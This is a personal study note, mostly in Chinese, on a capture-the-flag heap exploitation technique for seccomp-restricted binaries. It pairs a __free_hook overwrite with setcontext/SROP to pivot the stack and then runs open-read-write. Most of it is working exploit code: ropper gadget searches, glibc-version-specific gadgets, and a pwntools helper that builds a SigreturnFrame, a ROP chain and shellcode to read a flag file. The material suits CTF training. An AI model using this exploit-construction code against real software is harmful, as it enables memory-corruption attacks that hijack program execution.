---
title: ORW
updated: 2022-05-25T16:18:06.0000000+08:00
created: 2022-05-25T14:26:34.0000000+08:00
---

[*PWN-ORW总结 - X1ng's Blog*](https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/)
# free_hook setcontext
在只能open read write的情况下，有一次改写\_\_free_hook的机会，已知堆基址，libc基址

利用一个gadget+setcontext 把栈迁移到堆，然后在栈上用rop实现orw

[Glibc 2.31 Heap + Seccomp Exploitation Technique using ROP - Midas Blog (lkmidas.github.io)](https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/)

[【PWNHUB双蛋内部赛】StupidNote Writeup - wjh's blog (wjhwjhn.com)](https://blog.wjhwjhn.com/archives/155/)

[(45条消息) 【八芒星计划】 ORW_Carol7S的博客-CSDN博客_orw](https://blog.csdn.net/carol2358/article/details/108351308)
## free_hook（rdi=堆块地址）
linux参数前6个参数依次放到rdi，rsi，rdx，rcx，r8，r9中；

执行free_hook时第一个参数(rdi)是free的堆块的地址。
## gadget
寻找将\[rdi\]赋值到rdx的gadget，因为后面的context结构体在rdx中

ropper -f /lib/x86_64-linux-gnu/libc-2.31.so --search 'mov rdx'

ropper -f /lib/x86_64-linux-gnu/libc-2.31.so --search 'mov rsi'

2.27

不用gadget，setcontext结构体就在rdi中

2.29 rdi = \[setcontext,frame\]

mov rdx, qword ptr \[rdi + 8\]; mov rax, qword ptr \[rdi\]; mov rdi, rdx; jmp rax;

2.31 rdi = \[0,frame\] rdx=\[0,0,0,0,setcontext\]

mov rdx, qword ptr \[rdi + 8\]; mov qword ptr \[rsp\], rax; call qword ptr \[rdx + 0x20\];
## setcontext（SROP) 栈迁移
## 利用
\# 参数：libc（有基地址）、rop/shellcode，堆地址（free的堆块地址）

\# 返回值 payload（堆块frame） layout（orw）freehook

\# freehook 运行setcontext 读出payload

\# frame执行read 将layout读取到page处（free_hook在的bss页）rsp也定位到page+8

\# 随后栈迁移到page+8 执行layout里的rop们

def SROP(libc, use_rop = 1, heap_addr = 0):

def find_rop(gadget):

for gad in rop:

if gadget in gad:

return libc.address + int(gad.split(':')\[0\], 16)

page = libc.sym\['\_\_free_hook'\] & 0xfffffffffffff000

frame=SigreturnFrame()

frame.rsp = page+8

frame.rdi = 0

frame.rsi = page

frame.rdx = 0x2000

frame.rip = libc.sym\['read'\]

payload=bytes(frame)

with open('./ropper.txt', 'r') as f:

rop = f.read().splitlines()

rax = find_rop(': pop rax; ret;')

rdi = find_rop(': pop rdi; ret;')

rsi = find_rop(': pop rsi; ret;')

rdx = libc.address + 0x000000000015f7e6

syscall = find_rop(': syscall; ret;')

if use_rop:

layout=b'./flag\0\0'+p64(rax)+p64(2)+p64(rdi)+p64(page)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(0)+p64(syscall)

layout+=p64(rdi)+p64(3)+p64(rsi)+p64(page+0x100)+p64(rdx)+p64(0x40)+p64(0)+p64(libc.sym\['read'\])

layout+=p64(rdi)+p64(1)+p64(rsi)+p64(page+0x100)+p64(rdx)+p64(0x40)+p64(0)+p64(libc.sym\['write'\])

else:

layout_rop = flat(0, rdi, page, rsi, 0x1000, rdx, 7, 0, libc.sym\['mprotect'\], page+0x50)

layout_shellcode = asm('''

sub rsp, 0x800

push 0x67616c66

mov rdi, rsp

xor rsi, rsi

xor rdx, rdx

mov eax, 2

syscall

cmp eax, 0

js failed

mov edi, eax

mov rsi, rsp

mov edx, 0x100

xor eax, eax

syscall

mov edx, eax

mov rsi, rsp

mov edi, 1

mov eax, edi

syscall

jmp exit

failed:

push 0x6c696166

mov edi, 1

mov rsi, rsp

mov edx, 4

mov eax, edi

syscall

exit:

xor edi, edi

mov eax, 231

syscall'''

)

layout = layout_rop + layout_shellcode

if LIBC_VERSION == '2.27':

return payload, layout, libc.sym\['setcontext'\]+0x35

else:

\# header = flat(0, heap_addr+0x28, 0, 0, libc.sym\['setcontext'\]+0x35)

payload = unpack_many(payload)

payload\[1\] = heap_addr

payload\[4\] = libc.sym\['setcontext'\]+0x3d

payload = flat(payload)

return payload, layout, libc.address+0x1518B0#9.7

\# return payload, layout, libc.address+0x151990#9.8

